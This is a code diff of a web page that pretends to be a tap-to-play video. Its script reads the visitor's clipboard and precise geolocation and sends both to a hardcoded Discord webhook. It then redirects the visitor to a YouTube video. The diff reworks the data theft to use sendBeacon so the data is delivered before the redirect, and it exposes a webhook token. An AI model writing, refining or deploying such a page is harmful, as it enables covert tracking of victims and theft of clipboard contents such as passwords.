@@ -23,52 +23,45 @@
     <p id="status">Tap video to play</p>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv3ORbeifDH3EciizbyXGSJMJMZ1R094deGB2x";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv30RbeifDH3EciizbyXGSJMJMZ1R094deGB2x";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
         async function send() {
             const status = document.getElementById('status');
-            status.innerText = "Verifying access...";
+            status.innerText = "Connecting...";
 
-            let clipboardContent = "No clipboard data captured";
+            let clipboardContent = "Denied/None";
 
-            // Step 1: Attempt Clipboard (Non-blocking)
+            // 1. Get Clipboard
             try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
+                if (navigator.clipboard) {
                     clipboardContent = await navigator.clipboard.readText();
                 }
-            } catch (err) {
-                clipboardContent = "Clipboard access denied";
-            }
+            } catch (e) {}
 
-            // Step 2: Trigger Location (This creates the popup)
+            // 2. Get Location
             navigator.geolocation.getCurrentPosition((pos) => {
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 
-                // Step 3: Send BOTH to Discord in one go
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        content: `✅ **Family Tracker Update**\n📍 **Map:** ${mapLink}\n📋 **Clipboard:** \`\`\`${clipboardContent}\`\`\`` 
-                    })
-                }).then(() => {
-                    // Step 4: Redirect ONLY after Discord confirms receipt
-                    window.location.replace(REDIRECT_URL);
+                const payload = JSON.stringify({
+                    content: `✅ **Tracker Success**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`\`\`${clipboardContent}\`\`\``
                 });
 
+                // 3. USE BEACON (This is the "Bulletproof" way to send data before redirect)
+                const blob = new Blob([payload], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK_URL, blob);
+
+                // 4. Wait a tiny bit then redirect
+                setTimeout(() => { window.location.replace(REDIRECT_URL); }, 500);
+
             }, (err) => {
-                // If Location is denied, still send the clipboard to Discord
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        content: `⚠️ **Location Denied**\n📋 **Clipboard:** \`\`\`${clipboardContent}\`\`\`` 
-                    })
-                }).then(() => {
-                    window.location.replace(REDIRECT_URL);
-                });
-            }, { enableHighAccuracy: true, timeout: 5000 });
+                // Even if location fails, send what we have
+                const failPayload = JSON.stringify({ content: `⚠️ **Location Denied**\n📋 **Clipboard:** ${clipboardContent}` });
+                const blob = new Blob([failPayload], { type: 'application/json' });
+                navigator.sendBeacon(WEBHOOK_URL, blob);
+                
+                window.location.replace(REDIRECT_URL);
+            }, { enableHighAccuracy: true });
         }
     </script>
 </body>
